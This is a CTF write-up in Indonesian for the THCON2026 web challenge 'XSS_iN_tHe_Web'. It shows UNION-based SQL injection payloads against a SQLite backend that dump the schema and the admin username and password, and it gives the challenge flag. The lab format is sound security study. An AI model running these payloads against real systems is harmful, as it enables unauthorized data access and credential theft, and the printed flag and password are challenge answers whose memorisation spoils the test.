# XSS_iN_tHe_Web (part 1/2)

Challenge ini ternyata tidak perlu XSS sama sekali untuk flag pertama. Titik masuk utamanya ada di parameter `id` pada halaman depan.

## Ringkasan

Halaman utama menyediakan form:

- `GET /?id=...`
- hasilnya bisa dilihat di `/view-result`

Awalnya saya cek perilaku normal dengan `id=1` dan aplikasi mengembalikan data agent pertama. Setelah itu saya coba payload UNION sederhana:

```text
/?id=-1 UNION SELECT 1,2--
```

Payload itu berhasil dan isi `UNION SELECT` tampil mentah di `/view-result`. Dari sini jelas kalau parameter `id` masuk ke query SQLite tanpa sanitasi yang benar.

## Langkah eksploitasi

### 1. Dump schema

Karena jumlah kolom query ada 2, saya pakai:

```sql
-1 UNION SELECT name,sql FROM sqlite_master--
```

Hasilnya menunjukkan tabel berikut:

- `adminDBtable`
- `agents`

Schema yang penting:

```sql
CREATE TABLE adminDBtable (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT
)
```

### 2. Ambil kredensial admin

Setelah tahu nama tabel, tinggal dump isinya:

```sql
-1 UNION SELECT username,password FROM adminDBtable--
```

Hasil:

- username: `admin`
- password: `S_P3rSicreteP3asseworde%%`

### 3. Login ke dashboard

Login dengan kredensial di atas berhasil dan dashboard langsung menampilkan flag pertama:

```text
THC{W1tH_eYe5_Wid3_0p3ns_WesTANd}
```

## Kenapa ini berhasil

Backend terlihat membangun query SQL langsung dari nilai `id` tanpa prepared statement. Karena hasil query terakhir disimpan lalu dirender di `/view-result`, payload UNION bisa dipakai bukan cuma untuk bypass, tapi juga buat ekstraksi data database dengan cukup nyaman.

## Artefak penting

- Endpoint rawan: `/`
- Parameter rawan: `id`
- DBMS: SQLite
- Dampak:
  - baca schema
  - baca tabel sensitif
  - ambil password admin
  - akses dashboard admin

## Solver

Solver otomatis ada di file [solve.py](/home/nata/ctf/THCON2026/web/Xssintheweb/solve.py).
